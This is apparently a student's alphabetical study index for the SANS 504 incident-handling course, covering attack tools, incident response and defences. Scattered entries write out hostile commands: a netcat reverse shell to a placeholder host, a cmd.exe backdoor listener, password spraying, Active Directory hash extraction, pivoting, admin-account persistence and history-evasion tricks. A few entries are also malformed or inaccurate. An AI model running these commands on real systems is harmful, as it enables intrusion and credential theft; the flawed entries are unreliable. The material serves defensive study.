 # SANS 504 Index

`504.1`
Incident Response and Cyber Investigation

`504.2`
Recon, Scanning and Enumeration Attacks

`504.3`
Password and Access Attacks

`504.4`
Public- Facing and Drive-By Attacks

`504.5`
Evasive and Post Exploitation Attacks

`504.6`
Capture the Flag Event

# 

`.`


---

`.bash_history`; unmodified after an attacker executes kill -9 $$ (\$$ is the process id of the currently running process in UNIX). 

`/`


---

`/var/log/messages`; _Security risk_… An attacker can remove specific log entries using a basic text editor.

`/etc/rsyslog.conf`; On a Linux system _*.*@@192.168.10.2_ would be used to send all logging information to host server 192.168.10.2 using TCP 514. 

`A`


---

`Access Logs`; Text files used to record individual requests sent through a proxy. [1:58] 

`Account Harvesting`; Returning a standard error message upon failed login can help mitigate account harvesting in a web application. 

`Alternate Data Stream`; 



* `PowerShell Search Exampl`e; Get-ChildItem -recurse | for each { Get-Item $_.FullName -Stream * } | where stream -ne ‘:$DATA’
    * `Get-ChildItem -recurse`; Will search all files starting from the current directory. 
    * `for each { Get-Item $_.FullName -Stream * }`; Will enumerate all streams for every identified file. 
    * `where stream -ne ‘:$DATA’`; Will limit the display to only non-default data streams. 

`Analyzing Packet Captures`; The Gold Standard that provides the lowest practical view of network data and is available to be viewed offline. (See tcpdump) [1:52]

`Application Allow List`; Many times the actual path to allow a list bypass is due to a misconfiguration on the target environment. Prevents the execution of unauthorized code. [5:12]

`Argon2`; Winner of Password Hashing Competition in 2015. (See Bcrypt, Scrypt, PBKDF2, Yescrypt) [3:27]

`Assembly Code`; Can be modified to avoid detection on endpoint systems. [5:9]



* `Code`;
    * `xor`; Anything xor’d against itself equals 0. [5:9]
    * `push`; Means to throw the register onto the stack. [5:9]
    * `pop`; Remove the register on the stack. [5:9]
    * `nop`; No-operation instruction. [5:9]

`Attacker Opportunity`; Browsers will do what the server tells them to do. XSS allows an attacker to send custom commands on behalf of the server to the victim. (See XSS) [4:54]

`Autoruns`; A comprehensive list of ASEP (Autostart Extensibility Point). Provides the capability to identify scheduled task changes, WMI event subscriptions and event-triggered execution through debugging capabilities.  [1:46]

`AzureStealth`; Used by defenders to carefully monitor their exposure to shadow admin accounts. [5:79] 

`B`


---

`Bcrypt`; Uses multiple hashing rounds and offers flexible implementation wher CPU costs can be adjusted overtime to combat GPU acceleration.(See PBKDF2, Scrypt, Argon2 and Yescrypt) [3:27]

`BeEF (Browser Exploitation Framework)`; Modular framework for browser exploitation. Commonly used for XSS and Social Engineering attacks. Designed to exploit browsers and uses a default file name hook.js to deliver the attack. [4:25]

`Berkeley Packet Filter (BPF)`; Specialized language to filter packets. (see tcpdump) [1:55-56]



* `Three kinds of qualifiers…;`
    * `type`; What kind the ID is (host, net, port, or portrange) [1:55-56]
    * `dir`; The direction (src, dst) [1:55-56]
    * `proto`; Match a protocol (ip, tcp, udp, icmp, etc.) [1:55-56]

`BloodHound`; A tool that graphs the quickest way to get domain admin privileges. [2:89]

`Breakout Time`; From initial compromise to privilege escalation on additional internal network targets. [2:10]

`Bucket_finder.rb`; A tool used to enumerate AWS S3 buckets. Three statuses: Access denied, does not exist, or is publicly accessible.. (See Cloud Storage and gcpbucketsbrute.py) [3:69]

`BuiltWith.com`; Reports on trends for internet technology, including analytics providers, CDN providers, and hosting providers including cloud services. 

`C`


---

`Cert Transparency`; Requires CA’s to publish certificate issuance logs. Use CT searches to identify unknown targets associated with an org or the presence of a new host. [2:21-22]

`Cloud Incident Response`; Best done with cloud workstations. Working where the data is will be much faster and less costly.  [1:91,1:100]



* `Notes`;
    * _Traffic Monitoring_ logging service should be deployed on critical systems to collect full packet captures. 
    * _API Access_ is used to log programmatic access to cloud services. 
    * _Network Flow_ monitors network traffic sessions.
    * _Application _service logs events for a specific application. 
* `Example`; 
    * `Cloud-based investigation`; If you discover a previously undocumented netowkr in the organization that contains computers restoring infected files you must… Re-scope the incident, including the newly discovered network. 
* `Ideal Situation`; Logging, host analysis, and storage should be an alternate cloud service account (such as a SANS SWIFT workstation) for isolation. [1:91]
* `What to Log`; [1:92]
* `Cloud Analysis Tools`; Once logging is configured for the cloud provider, we can start to apply _detection _and_ threat hunting_ using the cloud data. [1:93]
* `Containment`; Use external block storage during data collection. [1:94-95]
* `Analysis`; S3 logs record user agent information and other useful content. 
    * `s3logparse`; Tool for reviewing logging information. [1:96]
    * `vpc-flow-log-analysis`; Tool for reviewing logging information. [1:96]
    * `SIEM Tools`; Normalize the disparate logging formats into a unified interface such as Splunk, Elastic Stack, and Azure Sentinel. [1:96]
* `Response`; Access key revocation. [1:97]
* `Recovery and Remediation`; _Goal…_Correction of the root-cause. Restore snapshots to known-good versions. Review and audit access passwords, keys, tokens, roles, policies, and permissions. Increase logging verbosity on target systems. [1:98]

`Cloud Logging`; Logging will be very platform and organization specific. Write logs to a storage bucket owned by a different account. Use cloud tools for monitoring, alerting and logging data. Retain logging data for as long as it's useful. [5:89]

* `Example`; 
    * `Cloud Provider and bucket name`; A cloud admin creates a network log filter to display the TLS Server Name Indication field for all HTTPS traffic.

`CloudMapper`; An open-source tool for visualizing AWS and auditing AWS cloud deployments. [5:87]

`Cloud Scanning`; Cloud targets should be done using the same cloud provider. (See EyeWitness) [2:67-70] 



* `Exhaustive IP Address Enumeration`; Cloud providers publish lists of their cloud IP addresses in JSON format. (See Masscan) [2:70]

`Cloud Scanning Defense`; Ask _who_ needs to connect to this server and apply firewall rules to restrict access. [2:78]

`Cloud Services`; [1:90]



* `Infrastructure as a Service (IaaS)`; The most low-level cloud functionality, allowing customers to leverage cloud-provided storage, networking, and hardware. [1:90] 
* `Platform as a Service (PaaS)`; Allows the customer to focus on the application, content, and data while the provider manages the underlying operating system and the services to support the application. [1:90]
* `Software as a Service (SaaS)`; Focus on the upper-layer application functionality and data such as, DropBox, Office 365, etc. [1:90]

`Cloud Storage`; DNS, HTTP proxy and network logs are a valuable tool for identifying cloud storage used in your organization. [3:66-68,3:76]

`Cloud Storage Logging`; Configure cloud storage to log requests and identify abuse. [3:78]

`Cloud Storage Scanning`; Take a wordlist of names and identify if the bucket exists and if it's accessible. (See bucket_finder, BasicBlobFinder.py and gcpbucketbrute.py) [3:69]



* `Example`; 
    * Attackers can change the permissions on publicly accessible buckets that are misconfigured to allow an unauthorized user to use the _storage.buckets.setIamPolicy_ privilege. 

`Cloud Post-Exploitation`; Attacker situation report for AWS. (See WeirdAAL, Pacu and GCP PrivEsc Scanner)  [5:77-84]

`Cloud Post-Exploitation Defense`; Understand your infrastructure, audit permissions and policies, and verify and monitor asset logs. 

`Code-Executing Microsoft Office Files`; These files require macro support. [4:20]

`Command Injection`; Some web applications take input from a user and then process that input by launching a command shell to run a program to deal with the input. [4:43] 



* `Resource`; 
    * `Identifying Command Injection Vulnerabilities`; [4:44]

`Command Injection Defense`; Educate developers of improper user input. Conduct vuln assessments. Web application firewalls. Look for unusual traffic. [4:48]

`Command Stacking`; The use of command separators to run multiple commands in one line. [4:46]

`Conventional Exploit Delivery`; Drive-by and watering hole attacks will use available exploits to take advantage of browser vulnerabilities as well as vulnerability in associated software. [4:23]

`Credential Stuffing`; Where an attacker uses external breach information from other sites to gain insight into passwords used by users in your organization. [3:10]

`Cross-SiteScripting (XSS)`; An attack against users. Allowing an attacker to choose content that is displayed to the user in the context of the trusted website. (See Reflected XSS and Stored XSS) [4:53-63]



* `Reference`; What can an attacker do with XSS? [4:58]
* `Reference`; Testing for XSS. [4:59]

`Cross-Site Scripting (XSS)Defense`; Filter user input on the server side. Third-party filtering libraries are best. Limit cookie accessibility with HTTPOnly flag. Server set a Content Security Policy. [4:59-60]

`CyberChef`; Useful for encoding and decoding any data. [1:38]

`D`


---

`DAIR;` Dynamic. Approach. Incident. Response [1:20]

* `Preparation`; Know thy organization, Internal visibility,Plans for recovering systems, Prepare the IR team (training, practice, ethics, obligations). [1:21]
* `Detection`; The first decision is always verification. Once an incident has been verified you should start triaging.[1:22]
    * `Example`; Analyst will check the host listening ports for suspicious listeners. 
* `Verification and Triage`; During triaging, an incident’s scope is identified - what type of incident, what assets are affected, etc.  
    * `Example`; When handling a virus infection incident, conferring with business unit owners to find the importance of the infected systems. 
* `Scoping`; Determine where threat actors are. The scope of an incident may change as the incident processes. [1:24] 
* `Containment`; Stop the threat actor from continuing to operate in the environment. May occur in multiple stages: Business decision, Evidence collection [1:27]
    * `Example`; Blocking inbound packets from a specific Autonomous System Number. 
* `Eradication`; Undoing the threat actor actions. May also help meet goals such as recovery. [1:28]
* `Recovery`; Focused purely on the business impact of an incident, and what is necessary to limit interruptions to normal business operations. The most cost-effective way of recovering a compromised system is to rebuild it. [1:29]
* `Remediation`; Fixing the underlying cause of the incident. Shorter term actions are usually considered containment.  [1:30]
* `Post-Incident`; Final incident report (AKA _After Action Report_). Follow-up reviews help reduce the fading impact of an incident. [1:31]

`Data Collection and Exfiltration`; [5:66]



* `Notes`; 
    * `Reference (Linux)`; Linux Password Harvesting. [5:67]
    * `Reference (Linux)`; Sudo Privileges. [5:68]
    * `Reference (Windows)`; Windows Passwords: Mimikatz. [5:69-70]
    * `Reference (Windows & Mac)`; Password Managers and Clipboard Access. [5:71]
    * `Reference`; Meterpreter Keystroke Logging. [5:72]
* `Examples`; 
    * Attackers with access to a system circumvent the security of a Password Manager by retrieving the passwords copied to the clipboard. 

`Data Collection and Exfiltration Defense`; Limit egress network access, monitor authorized access, use network monitoring tools, deploy application allow list execution control to limit access to built-in and third-party software and Post-exfiltration SRUM data can help characterize data transfer totals and apps used. [5:73]

`dd`; Command to capture a forensic disc image. 



* `Example`; Meterpreter will be completely missed upon analysis of the dd image produced. 

`DeepBlueCLI`; A PowerShell script that parses Windows event logs. [2:98-105]



* Searches for unusual behavior or characteristics. [2:98]
* Generates straightforward output characterizing the EOI. [2:98]

`DefenderCheck`; Uses a Hi-Lo strategy, splitting the file into pieces and scanning with defender repeatedly until the smallest data chuck is found that triggers a threat alert. (See Ghostwriting) [5:11]

`dig`; Used to interact with a DNS server. (See nslookup)  [2:32]

`DNS`; <span style="text-decoration:underline;">UDP Port 53</span>. Identifies detailed information about organizations including IP Addresses, hostnames, email addresses, Mail eXchange (MX) records, and more. (See nslookup/dig); [2:32]

`DNS Automated Interrogation`; Useful for host discovery. (See nmap) [2:35]

`Domain Compromise`; If a domain has been compromised using a golden ticket attack, it is required that the krbtgt password be changed twice. 

`DPAT`; Analysis tool (python) to characterize password selection in your windows domain. Reveals systemic problems in how users select their passwords. (Required options (`-n` / Hashes extracted from the domain controller) (`-c` / List of cracked passwords) [3:54-63]



* `Example`; 
    * `-g option`; Analysis of patterns in password selection shared by people in the same group. 

`Drive-By Attacks`; Attacking systems through normal web browsing activity. [4:16-18]



* `Steps`; 
1. Attacker identifies and exploits a legitimate website. [4:17]
2. Attacker adds code and exploit to compromise website. [4:17]
3. Victim browses to compromised website. [4:17]
4. Attacker delivers exploit to victim. [4:17]
5. Victim connects back to the attacker granting remote access. [4:17]
* `Examples`; 
    * A browser that supports HTML5 provides integrated video as an additional attack surface. 

`Drive-By Attack Defense`; App-allow lists, patch management practices, monitor trends, and threat intel feeds. [4:30]

`Dual-Homed Host`; Providing access from the internet to internal systems is a vulnerability that can be introduced by a dual-homed host. 

`E`


---

`Endpoint Security Bypass`; Evasion can be modifying an existing tool to evade detection, modifying tactics to use tools that do not alert Endpoint Detection and Response (EDR), deploying the malware in a system _exclusion _directory, and code signing your malware. (See Ghostwriting) [5:6]

`Endpoint Security Bypass Defense`; Invest in an EDR platform, application allow list, threat hunting to identify the execution failures while attackers work on bypass, and logging and monitoring using User and Entity Behavior Analytics (UEBA). [5:17]

`Examining…`;



* `Services`;
    * `Services.msc`; Examine Services using the services control panel GUI. [1:41]
    * `net start`; Examine running services. [1:41]
    * `sc query`; Get more details about each service. [1:41]
    * `tasklist /svc`; Map running processes to services. [1:41]
* `Registry ASEPs (Autostart Extensibility Points)`;
    * `regedit`; Registry GUI. [1:42]
    * `reg query _regkey_`; View a registry key through the CLI. [1:42]
        * `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run` [1:42]
        * `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce` [1:42]
        * `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunonceEx` [1:42]
* `Accounts…`;
* `lusrmgr.msc`; Launch the GUI [1:43]
* `net user`; List users. [1:43]
* `net localgroup administrators`; Show who is in the _administrator _group. [1:43]
* `Tasks`; 
    * `schtasks`; Shows all scheduled tasks. [1:44]
    * `at`; Shows tasks scheduled with at. [1:44]
* `Log Entries`;
    * `eventvwr.msc`; GUI event log viewer.  [1:45]
    * `wevtutil qe security /f:text`; works on W7-W10
    * `Get-EventLog -LogName Security | Format-List -Property `*; Review the properties of all security logs.  [1:45]

`Event of Interest (EOI)`; Any event that causes interests such as a suspicious process. [1:70]

`EyeWitness`; Takes screenshots of websites, VNC and RDP services. (See Cloud Scanning) [2:76-77]

`F`


---

`Fake Installers`; Attackers use watering hole attacks to trick users into installing fake software. (See BeEF) [4:24]

`Fast Google Dork Scan (FGDS)`; A script that uses Google Dorks and a target domain to acquire information. [2:43]

`FileBaseDataStore`; A local directory on a server  used for file storage supporting up to 10,000 client endpoints. [1:25]

`G`


---

`gcloud`; Set of tools to create and manage Google Cloud resources. [5:84]



* `Commands`; 
    * `auth print-access-token`; Displays the token information required to enumerate a user’s password. 

`gcpbucketsbrute.py`; Identifies the presence of storage buckets and also enumerates the permissions associated with a a bucket. (See BasicBlobFinder.py and bucket_finder.rb) [3:70,3:72]

`GCP PrivEsc Scanner`; Used to assess the permissions accessible to an attacker. [5:80]

`Ghidra`; NSA released open-source analysis tool. (See aso IDA Pro) [1:85]

`Ghostwriting`; Modification through adding _junk-code_ to the assembly code in order to bypass Endpoint Detection Systems. (See Assembly Code and DefenderCheck)  [5:7-9]



* `Example`; 
    * `Add push and pop command`; Above xor eax,eax. 

`Google Dorks`; Using Google search modifiers, attackers can use Google to identify and collect useful reconnaissance information. (See Fast Google Dork Scan) [2:43]



* `Examples`; 
    * `link:222.[target_company].com`; Used to obtain information that would be useful in a phishing or spoofing attack. 

`gsutil`; Useful tool from google to download contents of a public bucket. (See gcpbucketsbrute.py) [3:70,3:73 | 5:84]

`H`


---

`Hashcat`; Password cracking tool. Takes advantage of GPUs for cracking. Hashcat needs to have several external files when cracking password hashes. First, the potfile needs to be created from the System registry and the NTDS.DIT file. Second, the actual ntds.dit file is required along with a password list for attempting to brute force credentials.  [3:36-45,3:56]



* `-m Options`;  
    * `1000 -NTLM`; b4b9b02e6f09a9bd760f388b67351e2b
    * `3000 - LANMAN`; 299bd128c1101fd6
    * `1400 - Sha-256`; 
    * `0 - MD5`;
* `-a Option`; Indicates the type of attack. 
* `Example`; hashcat -m 1400 -a hashes.txt words.txt ?!?d


`Hashing`; Converting passwords into a string of text or hash. (See LANMAN or NT for Windows Hashes and See UNIX and LINUX Password Hashes | See ntdsutil.exe, secretsdump.py, Mimikatz and hashdump for obtaining hashes) [3:13,3:24]



* `username:userid:LANMAN:NTHASH`; 
    * bob:1001:2c42686862534aa4a86fb73c70515bd7:17a7afd733dda50143b242a2aad8f0f7::
* `username:userid:EMPTYLANMAN:NTHASH`; 
    * tom:1002:aad3b435b51<span style="text-decoration:underline;">404ee</span>aad3b435b51<span style="text-decoration:underline;">404ee</span>:31d6cfe0d16ae931b73c59d7e0c089c0::

`Hashing Rounds`; Using multiple rounds of hashing makes the hash calculation slow for a normal user but greatly slows down an attacker. A single-iteration password hashing is considered insecure. [3:25-26]

`hashdump`; Obtains password hashes on local Windows machine.(See Mimikatz) [3:21] 

`HaveIBeenPwned.com`; Collects lists of username and passwords from major website breaches and proves a search service. [2:23]

`Hijacking Attacks`; When an adversary responds to a system request for services and pretends to be the legitimate system. (See Responder) [5:31]

`Hijacking Attacks Defense`; Disable LLMNR, Private VLANs, and UEBA tools. [5:34]

`histfile`; unset HISTFILE will prevent an active shell’s history from being saved when the session is exited later. 

`Hybrid Analysis`; A website that allows you to upload a specimen and then choose a virtual machine environment to run the specimen inside and record how it behaves. [1:75]

`hydra`; 



* `Example`; 
    * `Password Spray`; hydra -L userlist -p qwerty ssh://192.168.12.41

`I`


---

`ICMP Timestamp requests`; Aren't used for IP spoofing or port scans. ( See Network Mapping) 

`IDA Pro`; Well-known tool for analyzing and reverse engineering code. (See also Ghidra) [1:85]



* `Tools`;
    * `Hex-Rays Decompiler`; Take a binary and decompile into a more easily-read C-like source code. [1:85]

`Incident Response (IR`); The first step of an incident response team when an incident is detected is _Verification_. (See also Cloud Incident Response) [1:33]

`Intrusion Prevention System`; Monitors network traffic for protocol anomalies and prevents those it finds. 

`Instance Metadata (IMDS)`; Used to describe the running instance for cloud services. Web server compromises can possibly disclose sensitive cloud authentication tokens through the Instance Metadata. (See SSRF) [4:83]



* `Notes`; 
    * `Reference`; Instance Metadata Service Access. [4:90-92]

`Internet of Things (IoT)`; Devices connected to the internet such as doorbells, cameras, and fridges. [2:9]

`IP Header`; [2:52]

`J`


---

`John the Ripper`; Password cracking tool. [3:32-35] 


`JSON`; An ASCII-based data format widely used by cloud providers. (See JSON Query (JQ)) [2:68]

`JSON Query (JQ)`; Tool designed to work with JSON data. [2:68]

`K`


---

`Keyed Payloads`; A technique where the payload is encrypted using a key that is taken from the environment variable. [5:13]

`Kill`; 



* `Example`;
    * `Kill -9 $$`; Will terminate the shell without saving history. This as well as unset HISTFILE is used by attackers to prevent recent commands from saving to the shell history file located in $HOME/.bash_history.

`L`


---

`LANMAN Hash`; Legacy password hashing mechanism. Stop storing LANMAN hashes by defining reg key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa [3:14,3:46]

`Live Examination`; The application of tools and techniques to analyze activities on a running system to identify Indicators of Compromise (IOCs). [1:47]

`Living off the Land`; When attackers use the tools available to them without introducing new tools to the system. [3:93 | 5:13-14]



* `Examples`; 
    * Using atbroker to run malware. This uses a native Windows tool to achieve the attacker’s goals. 

`LLMNR`; Failing DNS, modern Windows systems will query local systems for a name using LLMNR (Link-Local Multicast Name Resolution) and failing that they will use NBT-NS (NetBIOS Name Service).

`Logs`; See Access Log and summarized logs. [1:58]  \
`M`


---

`MalwareInvestigations`; Two basic approaches, Monitoring the Environment and Examining Code: [1:74,1:78]



* `Monitoring the Environment`; Behavioral Analysis. [1:74,1:78]
    * `See VirusTotal.` [1:75]
    * `See Hybrid Analysis.` [1:75]
    * `See Regshot.` [1:80]
    * `See Process Monitor.` [1:46,1:82-84]
* `Examining Code`: Static Analysis. [1:74]
    * `See IDA Pro`. [1:85]
    * `(Windows) certutil -hashfile _file _MD5`; Calculate the MD5 hash of a file. [1:77]
    * `(Linux) md5sum _file_`; Calculate the MD5 hash of a file. [1:77]
    * `(Linux) strings file`; View ASCII strings. [1:77]
    * `(Linux) strings -e 1 file`; View 16-bit little endian Unicode strings. [1:77]
    * `(Linux) strings -e b file`; View 16-bit big endian Unicode strings. [1:77]

`Masscan`; Used for scanning large ranges, especially in the Cloud. Separates the _SYN send code_ from the _ACK receive code_ into different functionality. (See OpenSSL) [2:71-73]



* `Options`;
    * `-iL`; Scan the range of hosts reading the list of networks and CIDR masks. [2:72]
    * `-oL`; Saves the scan results to a new file. [2:72]
    * `-p`; Specify a certain port. [2:72]
    * `--rate`; Select the rate in which masscan runs. [2:72]

`Metadata`; Data providing information about one or more aspects of the data. [2:41]



* `Tools`;
    * `exiftool`; A Perl script that extracts metadata from different file types. [2:41]

`Memory Investigations`; [1:71]

`Metasploit Framework`; A flexible collection of modular tools to attack, exploit and harvest data from targets. (Other Frameworks - Immunity CANVAS, Core Impact, Commercial MSF) [4:5-13]



* `Modules`;
    * `Exploit`; Takes advantage of a flaw in a target program. [4:6,4:8]
    * `Payload`; Makes the target do something the attacker wants. Includes the code to be run on a target machine. [4:6,4:7]
    * `Auxiliary`; Performs all kinds of tasks, including scanning. [4:6]
    * `Post`; Used in post-exploitation to plunder or manipulate targets. [4:6]

`Metasploit Framework Defense`; Patch systems. Filter incoming and outgoing traffic. Utilize Microsoft Windows Exploit Protection. For Linux consider deploying SELinux-enabled versions. [4:11-12 | 5:39]

`Metasploit MsfVenom`; Takes any Metasploit payload and converts it into a standalone file. [4:27-29]

Meterpreter Payload; Carries a DLL to a target machine and injects it into a running process. 

`Microsoft 365 Compliance Search`; Built-in tool for attacker data discovery. [5:85]

`Mimikatz`; Used to obtain password hashes for a Windows machine. [3:21]

`MITRE ATT&CK (Adversarial Tactics, Techniques and Common Knowledge)`; Is a knowledge based framework, mapping adversary tactics, techniques, and procedures (TTPs). [2:13-16]

`mkfifo`; command to make a named pipe (First In, First Out). (See nc) [3:91]

`MSBuild.exe`; A built-in Windows tool for building and executing C/C++/C# code. [5:15]

`MsfVenom`; Has the ability to export any Metasploit payload into C# source. [5:15]

`Multi-Factor Authentication (MFA)`; Is the best defense against password cracking, guessing, and spraying attacks. [3:49]

`N`


---

`Net`; manages almost any aspect of a network and its settings, including network shares, network print jobs, and network users.



* `Commands`;
    * `Accounts`; Lists the password and lockout attributes. 
    * `localgroup`; Displays the name of the server and the names of local groups on the computer. [1:43 | 5:39,5:52 | 6:28]
    * `Session`; Lists or disconnect sessions between the computer and others on the network.  Displays information about all sessions with the local computer. [2:92,2:95]
    * `start`; Used to start a network service or list running network services. 
    * `use;` Shows any NetBIOS/SMB connections a host has initiated to other systems. Connects a computer to or disconnects a computer from a shared resource, or displays information about computer connections. [2:84-85,2:92]
        * `Set up an admin session with a remote system and mount share “one” on your system example`; net use \\10.0.0.1\one adminpassword /u:adminuser
    * `user`; Lists the users and also net users. Adds or modifies user accounts, or displays user account information. (/del to remove specified SMB session) [2:86 | 5:39]
    * `view`; List of computers and network devices on the network. Displays a list of computers in your current domain. [2:85]

`NetBIOS`; On older Windows NT and 2000 systems SMB was carried over the NetBIOS protocol which used TCP and UDP ports 135 through 139. [2:83]

`Netcat (nc/Ncat)`; Moves data across the network [3:86], port scanning [3:87], making connections to open ports [3:88-89], backdoors [3:88-89] and relays (transferring data from machine to machine using standard I/O redirection) [3:90-91]. [3:82-94]



* `Modes`; 
    * `Client Mode (Default)`; Starts a connection to a specific port. You can pipe a program’s output to Netcat or pipe Netcat’s received data into a program. [3:83]
    * `Listen Mode (-l)`; Waits for connections on a specific port. All data received from the network is put on standard output. [3:84]
* `Examples`; 
    * `nc.exe -L -p 43567 -e cmd.exe;` Start a netcat listener on port 43567 and subsequently receive access to the Windows Command Prompt. 
    * `nc [serverIP] [Port] -e /bin/sh`; Pushes a shell from client to a listener
    * `nc -v -w3 -z 192.168.116.122 1-1024`; Conducting a port scan of TCP ports 1-1024. -z Means send minimal data. 

`Netcat Defense`; Defense against Netcat depends on the mode in which it is used. [3:92]



* `Modes`;
    * `Data Transfer`; Know what is running on your systems. [3:92]
    * `Port Scanner`; Close all unused ports. [3:92]
    * `Connecting to Open Ports`; Call all unused ports. [3:92]
    * `Backdoors`; Know what is running on your systems. [3:92]
    * `Relays`; Carefully architect your network with layered security. [3:92] 

`netsh`; Allows you to display or modify the network configuration of a computer that is currently running. Allows an investigator to collect detailed Windows Firewall configuration information from a host. [1:39]



* `Examples`; 
* `netsh advfirewall show currentprofile`; Examine built-in firewall settings. [1:39]
* `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=7582 connectaddress=192..168.1.24 connectport=80`; Pivot to 192.168.1.24. 

`netstat`; Shows listening and active TCP and UDP ports. [1:39]



* `netstat -na`; Look for unusual TCP and UDP ports and ports connected to remote servers. [1:39]
* `netstat -naob`; Show owning process ID and associated executables / DLLs. [1:39]
* `netstat -naob 5`; Automatically refresh every 5 seconds. [1:39]

`Network Investigation`; Analyzing Packet Captures, Web Proxies, Access Logs. [1:51,59]

`Network Firewalls`; Establish boundaries among networks of varying trust levels and apply rules to use various protocols. 

`Network mapping`; 



* `Example`; An analyst notices ICMP Timestamp replies sent from multiple IP addresses on a client LAN to a single IP address on another network segment within a short period of time. 

`nmap`; Used for network mapping, port scanning, and running scripts.To identify which addresses are in use, nmap sends four packets to each address on the target range. (`ROOT`: ICMP Echo Requests, TCP SYN to port 443, TCP ACK to port 80, ICMP Timestamp Request) (`NOT-ROOT:` TCN SYN to Port 80 and 443) (See Zenmap) [2:50-55,2:60-64]



* `Options`;
    * `-A`; Aggressive scan. [2:64]
    * `-Pn`; Tell nmap to not ping the target. [2:51]
    * `-sn`; Disables port scanning and focuses on host discovery. [2:52]
    * `--reason`; Reveals which host discovery test revealed the presence of each host. [2:52]
    * `--traceroute`; Record the path to each discovered host when it responds as up. [2:55]
    * `-oA`; Use the filename prefix to record the scan results as an XML file. [2:55]
    * `-sC`; Instructs nmap to use the default NSE category of scripts. [2:62]
    * `--script`=; Followed by the script name will run the nmap script. [2:62]
    * `-sV`; Version Scan. [2:63]

`nmap Scan Types`; Nmap allows for conducting several types of scans. (Ping Sweeps | ARP Scan | TCP Connection Scans | TCP SYN Scans | UDP Scanning | Version Scanning | IPv6 Scanning). [2:60]

`nmap NSE Scripts`; Nmap includes support for the _Nmap Scripting Language_ (NSE). [2:62]

`nslookup`; Used to interact with a DNS server. (See dig/Zone Transfer) [2:32-33]

`NT Hash`; Modern Windows systems use NT hashes but still don’t use salts. [3:15]

`ntdsutil.exe`; Using built in tools such as ntdsutil.exe for obtaining password hash data is less likely to trigger alerts. (See secretsdump.py) [3:19]



* `Examples`; 
    * `Ntdsutil “activate instance ntds” “ifm” “create full c:\ntdsbak” “quit” “quit”`; Extracts a database with Active Directory and SYSTEM registry hive data. 

`O`


---

`OpenSSL`; CLI tool that can connect to one server at a time. (See TLS-Scan) [2:73] 

`OSINT (Open-Source Intelligence)`; Includes planned sharing and unplanned sharing. Can be leveraged offensively and defensively. (See SpiderfFoot) [2:18-19,2:24]

`P`


---

`Pacu`; The AWS interrogation and attack framework, designed to initially be the Metasploit for AWS. [5:82]

`PAM (Pluggable Authentication Module)`; A suite of libraries that allows a Linux system admin to configure methods to authenticate users. (I.E. Enforce password complexity)

`Password Complexity (Windows)`; Windows environments can enforce password complexity controls using the Active Directory Users and Computers MMC snap-in. [3:47]

`Password Complexity (UNIX/Linux)`; Pluggable Authentication Modules are used to extend the authentication functionality of the system. [3:48]

`Password Cracking`; Attempts to recover usable credentials when credential material such as password hashes are obtained. Exploit a system of low importance, dump all password hashes, crack password hashes for as long as necessary and reuse recovered passwords to access high-importance targets. (See John the Ripper/Hashcat and MFA) [3:31,3:51]

`Password Guessing Attacks`; Many passwords are used against a small number of accounts on a small number of targets. (See Password Spraying) [3:4]

`Password Salting`; Adding salt to the password adds _randomness _to the password hashes. Defeats Rainbow Tables. Two hashes of the same passwords would be different because unique salts were used. Makes Rainbow Tables difficult to utilize. [3:17]

`Password Spraying`; To avoid lockout, attackers will perform a password spray attack. You should know the ‘bad login counter timer’ before attempting a password spraying attack. (See Password Guessing Attack) [3:5]

`PBKDF2`; Password.Based.Key.Derivation.Function.2. Uses a flexible number of rounds (2 hashes per round) Widely recommended by nist for _Mitigating GPU-Based Password Cracking_. (See Bcrypt, Scrypt, Argon2, Yescrypt) [3:27]

`Persistence`; _Goals_…Regain Access, Avoid Detection, Preserve Privileges, Flexible in Reestablishing Access. [5:38-52]



* `Examples`; 
    * Configuration of a scheduled task. 
    * (Add a user) Meterpreter > execute -f “net user /add admin2 [password] & Meterpreter > execute -f “net localgroup administrators /add admin2”
* `Notes`; 
    * `References`; Create an account. [5:39]
    * `Reference`; Services. [5:40]
    * `Reference (Windows)`; Silent Process Creation. [5:41-42]
    * `Reference (Windows)`; WMI Event Subscription. [5:43-42]
    * `Reference (Windows)`; Active Directory (Golden Ticket). [5:45-46]
    * `Reference`; Web Shells. [5:47]
    * `Reference (Linux)`; Linux Persistence. [5:48]
    * `Reference (Cloud)`; Cloud Persistence. [5:49]

`Persistence Defense`; Focus on discovery and identification, identifying autoruns, checking registry values and local commands for signs of persistence. [5:50,5:53]

`PICERL`;(Preparation. Identification. Containment. Eradication. Recovery. Lessons Learned) [1:18-20]


* `Preparation`; All the things an organization does _before _an incident, this includes policy, procedure, implementing internal monitoring, security _best practices_, etc. [1:18-20]
    * `Example`; Filter disallowed input characters for each possible encoding scheme at the application server. 
* `Identification`; Also called _detection_. Before an incident response starts the incident must first be identified. [1:18-20]
* `Containment`; Divided into multiple actions, short term containment, followed by evidence collection, and then longer term (more invasive). [1:18-20]
* `Eradication`; Undoing the damages done by killing processes, changing passwords, removing malicious data, launching fraud investigations, etc. [1:18-20]
* `Recovery`; Getting a business back up and running. Vital for a business to keep running. [1:18-20]
* `Lessons Learned`; When the final report is written and the vulnerabilities the threat actors exploited are fixed. [1:18-20]

`ping`; Useful in command injection when attempting to exfiltrate data due to its ability to inform the attacker that an outbound connection back to the attacker is possible. 

`Pivoting`; Used to gain access to new targets, to escalate privileges within the network, or to access alternate data sources. [5:20-28]



* `Investigation Example`; Searching firewall logs for other computers that connected to the same C2 server. 
* `Notes`; 
    * `Reference`; Meterpreter Pivoting. [5:21]
    * `Reference`; Meterpreter ROUTE Pivoting. [5:22]
    * `Reference`; Host Discovery and Port Scanning. [5:23]
    * `Reference`; SSH Port Forwarding. [5:24]
    * `Reference`; Port Forwarding with netsh. [5:25]

`Port Scanning`; Help identify openings on a system and the type of system. (See nmap/Zenmap) [2:57]



* `Common Ports (Total # 65,536)`;
    * `80`; TCP, Web Server [2:53]
    * `445`; TCP, Windows Server Message Block [2:53]
    * `53`; UDP, DNS Server  [2:53]
    * `6000`; TCP, X Windows Server [2:53]

`PowerShell Commands`; 



* `Example`; 
    * `Set-Content`; Can be used by an attacker to create an alternate data stream.

`ProcDump`; Captures process dumps useful for troubleshooting application performance. 

`Process Explorer`; Detailed information for running processes. [1:46]

